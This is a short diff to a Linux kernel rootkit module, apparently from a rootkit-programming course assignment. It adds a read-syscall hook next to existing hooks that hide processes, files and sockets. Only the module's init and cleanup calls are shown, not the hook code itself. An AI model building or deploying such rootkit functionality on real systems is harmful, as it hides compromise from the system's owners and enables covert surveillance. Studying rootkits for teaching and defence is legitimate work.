@@ -9,6 +9,7 @@
 #include "hide_socket.h"
 #include "include.h"
 #include "main.h"
+#include "read.h"
 
 /*
  * Function called when loading the kernel module.
@@ -21,7 +22,8 @@ int init_module (void)
 	initialize_control();
 	hook_getdents();	
 	hook_sockets();
-	
+	hook_read();
+
 	// TODO: remove debug instructions after this
 	hide_process(3611);
 	hide_file_path("/home/martin/rootkit_programming/assignment07/main.c");
@@ -42,6 +44,7 @@ void cleanup_module (void)
 	cleanup_control();
 	unhook_getdents();
 	unhook_sockets();
+	unhook_read();
 	
 	/* Finally, log the unloading */
 	ROOTKIT_DEBUG("Unloading rootkit... bye!\n");
